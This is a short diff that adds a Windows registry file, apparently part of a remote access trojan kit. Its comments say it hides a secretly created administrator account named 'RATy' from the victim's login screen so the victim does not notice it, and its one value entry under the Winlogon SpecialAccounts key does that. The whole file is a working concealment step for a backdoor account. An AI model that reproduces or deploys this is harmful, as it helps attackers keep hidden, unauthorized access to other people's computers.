@@ -1,0 +1,8 @@
+; This registry will hide the newly created admin on the login screen
+; So that when the getter will start hi pc, he wont see any newly craeted admin on the login screen
+; therefore neither will he be able to login as that newly created admin (The admin we created for RATy) 
+
+Windows Registry Editor Version 5.0
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
+"RATy"=dword:00000000 ;
